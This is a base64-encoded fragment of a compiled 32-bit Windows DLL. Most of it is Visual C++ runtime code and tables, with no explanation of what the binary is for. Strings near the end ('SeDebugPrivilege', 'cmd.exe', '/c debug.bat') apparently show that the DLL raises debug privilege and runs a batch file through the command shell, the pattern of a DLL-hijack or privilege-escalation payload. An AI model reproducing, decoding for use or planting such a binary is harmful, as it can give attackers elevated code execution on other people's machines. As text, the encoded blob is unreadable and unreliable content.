zpf8klYBQABCNSQAj0YoGiAeKRgHB6QKIRwGDxgKDxwKD+QhypvOl/ySVgFAAEJAj0YoGiAeDxgHB6QKDxwGD+QhyiPOl/ySVgFAAEI1JAHdQABBkUAAQXFAAEFRQABBMUAAQRFAAEDxQABA0UAAQi0SO5IlEj+SLRI7oiUSP6ItEjuyJRI/si0SO8IlEj/CLRI70iUSP9ItEjviJRI/4i0SO/IlEj/yNBI0AAAAAA/AD+P8klYBQABCL/5BQABCYUAAQpFAAELhQABCLRQheX8nDkIoGiAeLRQheX8nDkIoGiAeKRgGIRwGLRQheX8nDjUkAigaIB4pGAYhHAYpGAohHAotFCF5fycOQjXQx/I18Ofz3xwMAAAB1JMHpAoPiA4P5CHIN/fOl/P8klRxSABCL//fZ/ySNzFEAEI1JAIvHugMAAACD+QRyDIPgAyvI/ySFIFEAEP8kjRxSABCQMFEAEFRRABB8UQAQikYDI9GIRwOD7gHB6QKD7wGD+Qhysv3zpfz/JJUcUgAQjUkAikYDI9GIRwOKRgLB6QKIRwKD7gKD7wKD+QhyiP3zpfz/JJUcUgAQkIpGAyPRiEcDikYCiEcCikYBwekCiEcBg+4Dg+8Dg/kID4JW/////fOl/P8klRxSABCNSQDQUQAQ2FEAEOBRABDoUQAQ8FEAEPhRABAAUgAQE1IAEItEjhyJRI8ci0SOGIlEjxiLRI4UiUSPFItEjhCJRI8Qi0SODIlEjwyLRI4IiUSPCItEjgSJRI8EjQSNAAAAAAPwA/j/JJUcUgAQi/8sUgAQNFIAEERSABBYUgAQi0UIXl/Jw5CKRgOIRwOLRQheX8nDjUkAikYDiEcDikYCiEcCi0UIXl/Jw5CKRgOIRwOKRgKIRwKKRgGIRwGLRQheX8nDagLof8v//1nDi/9Vi+yD7CShAJAAEDPFiUX8i0UIU4lF4ItFDFZXiUXk6LTC//+DZewAgz30pwAQAIlF6HV9aFx4ABD/FdBgABCL2IXbD4QQAQAAiz1gYAAQaFB4ABBT/9eFwA+E+gAAAIs1OGAAEFD/1mhAeAAQU6P0pwAQ/9dQ/9ZoLHgAEFOj+KcAEP/XUP/WaBB4ABBTo/ynABD/11D/1qMEqAAQhcB0EGj4dwAQU//XUP/WowCoABChAKgAEItN6Is1IGAAEDvBdEc5DQSoABB0P1D/1v81BKgAEIv4/9aL2IX/dCyF23Qo/9eFwHQZjU3cUWoMjU3wUWoBUP/ThcB0BvZF+AF1CYFNEAAAIADrM6H4pwAQO0XodClQ/9aFwHQi/9CJReyFwHQZofynABA7Reh0D1D/1oXAdAj/dez/0IlF7P819KcAEP/WhcB0EP91EP915P914P917P/Q6wIzwItN/F9eM81b6AS9///Jw4v/VYvsVot1CFeF9nQHi30Mhf91Fegw5f//ahZeiTDoX+r//4vGX15dw4tNEIXJdQczwGaJBuvdi9ZmgzoAdAaDwgJPdfSF/3TnK9EPtwFmiQQKg8ECZoXAdANPde4zwIX/dcJmiQbo3uT//2oiWYkIi/Hrqov/VYvsi1UIU4tdFFZXhdt1EIXSdRA5VQx1EjPAX15bXcOF0nQHi30Mhf91E+ij5P//ahZeiTDo0un//4vG692F23UHM8BmiQLr0ItNEIXJdQczwGaJAuvUi8KD+/91GIvyK/EPtwFmiQQOg8ECZoXAdCdPde7rIovxK/IPtwwGZokIg8ACZoXJdAZPdANLdeuF23UFM8lmiQiF/w+Fef///zPAg/v/dRCLTQxqUGaJREr+WOlk////ZokC6BTk//9qIlmJCIvx6Wr///+L/1WL7ItFCGaLCIPAAmaFyXX1K0UI0fhIXcOL/1WL7FaLdQhXhfZ0B4t9DIX/dRXo0+P//2oWXokw6ALp//+Lxl9eXcOLRRCFwHUFZokG69+L1ivQD7cIZokMAoPAAmaFyXQDT3XuM8CF/3XUZokG6JPj//9qIlmJCIvx67yL/1WL7ItNCIXJeB6D+QJ+DIP5A3UUoYybABBdw6GMmwAQiQ2MmwAQXcPoW+P//8cAFgAAAOiJ6P//g8j/XcPMzMzMzMzMzMzMzFWL7FNWV1VqAGoAaAhWABD/dQjoKgUAAF1fXluL5V3Di0wkBPdBBAYAAAC4AQAAAHQyi0QkFItI/DPI6Li6//9Vi2gQi1AoUotQJFLoFAAAAIPECF2LRCQIi1QkEIkCuAMAAADDU1ZXi0QkEFVQav5oEFYAEGT/NQAAAAChAJAAEDPEUI1EJARkowAAAACLRCQoi1gIi3AMg/7/dDqDfCQs/3QGO3QkLHYtjTR2iwyziUwkDIlIDIN8swQAdRdoAQEAAItEswjoSQAAAItEswjoXwAAAOu3i0wkBGSJDQAAAACDxBhfXlvDM8Bkiw0AAAAAgXkEEFYAEHUQi1EMi1IMOVEIdQW4AQAAAMNTUbtQmwAQ6wtTUbtQmwAQi0wkDIlLCIlDBIlrDFVRUFhZXVlbwgQA/9DDZg/vwFFTi8GD4A+FwHV/i8KD4n/B6Ad0N42kJAAAAABmD38BZg9/QRBmD39BIGYPf0EwZg9/QUBmD39BUGYPf0FgZg9/QXCNiYAAAABIddCF0nQ3i8LB6AR0D+sDjUkAZg9/AY1JEEh19oPiD3Qci8Iz28HqAnQIiRmNSQRKdfiD4AN0BogZQUh1+ltYw4vY99uDwxAr0zPAUovTg+IDdAaIAUFKdfrB6wJ0CIkBjUkES3X4WulV////agr/FfBgABCjTKgAEDPAw8zMzMzMzMzMzMzMzMzMzFGNTCQIK8iD4Q8DwRvJC8FZ6boBAABRjUwkCCvIg+EHA8EbyQvBWemkAQAAV4vGg+APhcAPhcEAAACL0YPhf8HqB3Rl6waNmwAAAABmD28GZg9vThBmD29WIGYPb14wZg9/B2YPf08QZg9/VyBmD39fMGYPb2ZAZg9vblBmD292YGYPb35wZg9/Z0BmD39vUGYPf3dgZg9/f3CNtoAAAACNv4AAAABKdaOFyXRJi9HB6gSF0nQXjZsAAAAAZg9vBmYPfweNdhCNfxBKde+D4Q90JIvBwekCdA2LFokXjXYEjX8ESXXzi8iD4QN0CYoGiAdGR0l191heX13DuhAAAAAr0CvKUYvCi8iD4QN0CYoWiBdGR0l198HoAnQNixaJF412BI1/BEh181npC////8xWi0QkFAvAdSiLTCQQi0QkDDPS9/GL2ItEJAj38Yvwi8P3ZCQQi8iLxvdkJBAD0etHi8iLXCQQi1QkDItEJAjR6dHb0erR2AvJdfT384vw92QkFIvIi0QkEPfmA9FyDjtUJAx3CHIPO0QkCHYJTitEJBAbVCQUM9srRCQIG1QkDPfa99iD2gCLyovTi9mLyIvGXsIQAMzMzMzMzMzMzMzMUY1MJAQryBvA99AjyIvEJQDw//87yHIKi8FZlIsAiQQkwy0AEAAAhQDr6czMzMzMi0QkCItMJBALyItMJAx1CYtEJAT34cIQAFP34YvYi0QkCPdkJBQD2ItEJAj34QPTW8IQAMzMzMzMzMzMzMzMzFWL7FYzwFBQUFBQUFBQi1UMjUkAigIKwHQJg8IBD6sEJOvxi3UIg8n/jUkAg8EBigYKwHQJg8YBD6MEJHPui8GDxCBeycPMzMzMzMzMzMzMVYvsVjPAUFBQUFBQUFCLVQyNSQCKAgrAdAmDwgEPqwQk6/GLdQiL/4oGCsB0DIPGAQ+jBCRz8Y1G/4PEIF7Jw1WL7FdWU4tNEAvJdE2LdQiLfQy3QbNatiCNSQCKJgrkigd0JwrAdCODxgGDxwE653IGOuN3AgLmOsdyBjrDdwICxjrgdQuD6QF10TPJOuB0Cbn/////cgL32YvBW15fycPM/yXcYAAQxwW8ngAQQGEAELm8ngAQ6W3O//8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADQhQAAuIUAAKSFAAAAAAAAiIUAAICFAABshQAAEoYAACiGAAA4hgAASoYAAF6GAAB6hgAAmIYAAKyGAAC8hgAAyIYAANaGAADkhgAA7oYAAAaHAAAahwAAKocAADqHAABShwAAZIcAAHCHAAB+hwAAkIcAAKCHAADIhwAA1ocAAOiHAAAAiAAAFogAADCIAABGiAAAYIgAAG6IAAB8iAAAlogAAKaIAAC8iAAA1ogAAOKIAAD0iAAADIkAACSJAAAwiQAAOokAAEaJAABYiQAAZokAAHaJAACCiQAAmIkAAKSJAACwiQAAwIkAANaJAADoiQAAAAAAAPaFAAAAAAAAAAAAAAAAAAAAAAAAAisAENA4ABDhVwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJibABDwmwAQ+IAAEJAUABAZKQAQYmFkIGFsbG9jYXRpb24AAEsARQBSAE4ARQBMADMAMgAuAEQATABMAAAAAABGbHNGcmVlAEZsc1NldFZhbHVlAEZsc0dldFZhbHVlAEZsc0FsbG9jAAAAAENvckV4aXRQcm9jZXNzAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAAAFAADACwAAAAAAAAAdAADABAAAAAAAAACWAADABAAAAAAAAACNAADACAAAAAAAAACOAADACAAAAAAAAACPAADACAAAAAAAAACQAADACAAAAAAAAACRAADACAAAAAAAAACSAADACAAAAAAAAACTAADACAAAAAAAAAC0AgDACAAAAAAAAAC1AgDACAAAAAAAAAADAAAACQAAAJAAAAAMAAAAeIEAEMQpABAZKQAQVW5rbm93biBleGNlcHRpb24AAACMgQAQICoAEGNzbeABAAAAAAAAAAAAAAADAAAAIAWTGQAAAAAAAAAASABIADoAbQBtADoAcwBzAAAAAABkAGQAZABkACwAIABNAE0ATQBNACAAZABkACwAIAB5AHkAeQB5AAAATQBNAC8AZABkAC8AeQB5AAAAAABQAE0AAAAAAEEATQAAAAAARABlAGMAZQBtAGIAZQByAAAAAABOAG8AdgBlAG0AYgBlAHIAAAAAAE8AYwB0AG8AYgBlAHIAAABTAGUAcAB0AGUAbQBiAGUAcgAAAEEAdQBnAHUAcwB0AAAAAABKAHUAbAB5AAAAAABKAHUAbgBlAAAAAABBAHAAcgBpAGwAAABNAGEAcgBjAGgAAABGAGUAYgByAHUAYQByAHkAAAAAAEoAYQBuAHUAYQByAHkAAABEAGUAYwAAAE4AbwB2AAAATwBjAHQAAABTAGUAcAAAAEEAdQBnAAAASgB1AGwAAABKAHUAbgAAAE0AYQB5AAAAQQBwAHIAAABNAGEAcgAAAEYAZQBiAAAASgBhAG4AAABTAGEAdAB1AHIAZABhAHkAAAAAAEYAcgBpAGQAYQB5AAAAAABUAGgAdQByAHMAZABhAHkAAAAAAFcAZQBkAG4AZQBzAGQAYQB5AAAAVAB1AGUAcwBkAGEAeQAAAE0AbwBuAGQAYQB5AAAAAABTAHUAbgBkAGEAeQAAAAAAUwBhAHQAAABGAHIAaQAAAFQAaAB1AAAAVwBlAGQAAABUAHUAZQAAAE0AbwBuAAAAUwB1AG4AAABISDptbTpzcwAAAABkZGRkLCBNTU1NIGRkLCB5eXl5AE1NL2RkL3l5AAAAAFBNAABBTQAARGVjZW1iZXIAAAAATm92ZW1iZXIAAAAAT2N0b2JlcgBTZXB0ZW1iZXIAAABBdWd1c3QAAEp1bHkAAAAASnVuZQAAAABBcHJpbAAAAE1hcmNoAAAARmVicnVhcnkAAAAASmFudWFyeQBEZWMATm92AE9jdABTZXAAQXVnAEp1bABKdW4ATWF5AEFwcgBNYXIARmViAEphbgBTYXR1cmRheQAAAABGcmlkYXkAAFRodXJzZGF5AAAAAFdlZG5lc2RheQAAAFR1ZXNkYXkATW9uZGF5AABTdW5kYXkAAFNhdABGcmkAVGh1AFdlZABUdWUATW9uAFN1bgByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAA0ACgAAAAAAVABMAE8AUwBTACAAZQByAHIAbwByAA0ACgAAAFMASQBOAEcAIABlAHIAcgBvAHIADQAKAAAAAABEAE8ATQBBAEkATgAgAGUAcgByAG8AcgANAAoAAAAAAFIANgAwADMAMwANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIAB1AHMAZQAgAE0AUwBJAEwAIABjAG8AZABlACAAZgByAG8AbQAgAHQAaABpAHMAIABhAHMAcwBlAG0AYgBsAHkAIABkAHUAcgBpAG4AZwAgAG4AYQB0AGkAdgBlACAAYwBvAGQAZQAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgAgAEkAdAAgAGkAcwAgAG0AbwBzAHQAIABsAGkAawBlAGwAeQAgAHQAaABlACAAcgBlAHMAdQBsAHQAIABvAGYAIABjAGEAbABsAGkAbgBnACAAYQBuACAATQBTAEkATAAtAGMAbwBtAHAAaQBsAGUAZAAgACgALwBjAGwAcgApACAAZgB1AG4AYwB0AGkAbwBuACAAZgByAG8AbQAgAGEAIABuAGEAdABpAHYAZQAgAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAgAG8AcgAgAGYAcgBvAG0AIABEAGwAbABNAGEAaQBuAC4ADQAKAAAAAABSADYAMAAzADIADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AYwBhAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHMAdABkAGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADUADQAKAC0AIABwAHUAcgBlACAAdgBpAHIAdAB1AGEAbAAgAGYAdQBuAGMAdABpAG8AbgAgAGMAYQBsAGwADQAKAAAAAAAAAFIANgAwADIANAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAF8AbwBuAGUAeABpAHQALwBhAHQAZQB4AGkAdAAgAHQAYQBiAGwAZQANAAoAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA3AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAG0AdQBsAHQAaQB0AGgAcgBlAGEAZAAgAGwAbwBjAGsAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAABSADYAMAAwADgADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABhAHIAZwB1AG0AZQBuAHQAcwANAAoAAAAAAAAAUgA2ADAAMAAyAA0ACgAtACAAZgBsAG8AYQB0AGkAbgBnACAAcABvAGkAbgB0ACAAcwB1AHAAcABvAHIAdAAgAG4AbwB0ACAAbABvAGEAZABlAGQADQAKAAAAAAAAAAAAAgAAACBuABAIAAAAyG0AEAkAAABwbQAQCgAAAChtABAQAAAA0GwAEBEAAABwbAAQEgAAAChsABATAAAA0GsAEBgAAABgawAQGQAAABBrABAaAAAAoGoAEBsAAAAwagAQHAAAAOBpABAeAAAAoGkAEB8AAADYaAAQIAAAAHBoABAhAAAAgGYAEHgAAABgZgAQeQAAAERmABB6AAAAKGYAEPwAAAAgZgAQ/wAAAABmABBNAGkAYwByAG8AcwBvAGYAdAAgAFYAaQBzAHUAYQBsACAAQwArACsAIABSAHUAbgB0AGkAbQBlACAATABpAGIAcgBhAHIAeQAAAAAACgAKAAAAAAAuAC4ALgAAADwAcAByAG8AZwByAGEAbQAgAG4AYQBtAGUAIAB1AG4AawBuAG8AdwBuAD4AAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEAgQCBAIEAgQCBAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAQABAAEAAQABAAEACCAIIAggCCAIIAggACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAEAAQABAAEAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgAGgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAYEBgQGBAYEBgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBEAAQABAAEAAQABAAggGCAYIBggGCAYIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECARAAEAAQABAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAFAAUABAAEAAQABAAEAAUABAAEAAQABAAEAAQAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQAAEBAQEBAQEBAQEBAQEBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBEAACAQIBAgECAQIBAgECAQIBAQEAAAAAgIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6W1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/R2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AR2V0VXNlck9iamVjdEluZm9ybWF0aW9uVwAAAEdldExhc3RBY3RpdmVQb3B1cAAAR2V0QWN0aXZlV2luZG93AE1lc3NhZ2VCb3hXAFUAUwBFAFIAMwAyAC4ARABMAEwAAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBCYXNlIENsYXNzIEFycmF5JwAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoACBUeXBlIERlc2NyaXB0b3InAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAGBtYW5hZ2VkIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgb21uaSBjYWxsc2lnJwAAIGRlbGV0ZVtdAAAAIG5ld1tdAABgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwBgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAYHVkdCByZXR1cm5pbmcnAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHN0cmluZycAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHR5cGVvZicAAAAAYHZjYWxsJwBgdmJ0YWJsZScAAABgdmZ0YWJsZScAAABePQAAfD0AACY9AAA8PD0APj49ACU9AAAvPQAALT0AACs9AAAqPQAAfHwAACYmAAB8AAAAXgAAAH4AAAAoKQAALAAAAD49AAA+AAAAPD0AADwAAAAlAAAALwAAAC0+KgAmAAAAKwAAAC0AAAAtLQAAKysAACoAAAAtPgAAb3BlcmF0b3IAAAAAW10AACE9AAA9PQAAIQAAADw8AAA+PgAAPQAAACBkZWxldGUAIG5ldwAAAABfX3VuYWxpZ25lZABfX3Jlc3RyaWN0AABfX3B0cjY0AF9fZWFiaQAAX19jbHJjYWxsAAAAX19mYXN0Y2FsbAAAX190aGlzY2FsbAAAX19zdGRjYWxsAAAAX19wYXNjYWwAAAAAX19jZGVjbABfX2Jhc2VkKAAAAAAMfgAQBH4AEPh9ABDsfQAQ4H0AENR9ABDIfQAQwH0AELh9ABCsfQAQoH0AEJ19ABCYfQAQkH0AEIx9ABCIfQAQhH0AEIB9ABB8fQAQeH0AEHR9ABBofQAQZH0AEGB9ABBcfQAQWH0AEFR9ABBQfQAQTH0AEEh9ABBEfQAQQH0AEDx9ABA4fQAQNH0AEDB9ABAsfQAQKH0AECR9ABAgfQAQHH0AEBh9ABAUfQAQEH0AEAx9ABAIfQAQBH0AEAB9ABD8fAAQ+HwAEPR8ABDwfAAQ7HwAEOB8ABDUfAAQzHwAEMB8ABCofAAQnHwAEIh8ABBofAAQSHwAECh8ABAIfAAQ6HsAEMR7ABCoewAQhHsAEGR7ABA8ewAQIHsAEBB7ABAMewAQBHsAEPR6ABDQegAQyHoAELx6ABCsegAQkHoAEHB6ABBIegAQIHoAEPh5ABDMeQAQsHkAEIx5ABBoeQAQPHkAEBB5ABD0eAAQnX0AEOB4ABDEeAAQsHgAEJB4ABB0eAAQAAAAAAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn8AU2VEZWJ1Z1ByaXZpbGVnZQAAAAAAAAAAL2MgZGVidWcuYmF0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAAAAAAYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlAG9wZW4AAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAEOCBABADAAAAAAAAAAAAAAAAAAAACJAAEAyBABAAAAAAAAAAAAIAAAAcgQAQKIEAEESBABAAAAAACJAAEAEAAAAAAAAA/////wAAAABAAAAADIEAECSQABAAAAAAAAAAAP////8AAAAAQAAAAGCBABAAAAAAAAAAAAEAAABwgQAQRIEAEAAAAAAAAAAAAAAAAAAAAAAkkAAQYIEAEAAAAAAAAAAAAAAAAJCQABCggQAQAAAAAAAAAAABAAAAsIEAELiBABAAAAAAkJAAEAAAAAAAAAAA/////wAAAABAAAAAoIEAEAAAAAAAAAAAAAAAAGAlAADwQwAAEFYAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAA2REAEAAAAAD+////AAAAANT///8AAAAA/v///zkTABBKEwAQAAAAAIUUABAAAAAATIIAEAIAAABYggAQdIIAEAAAAA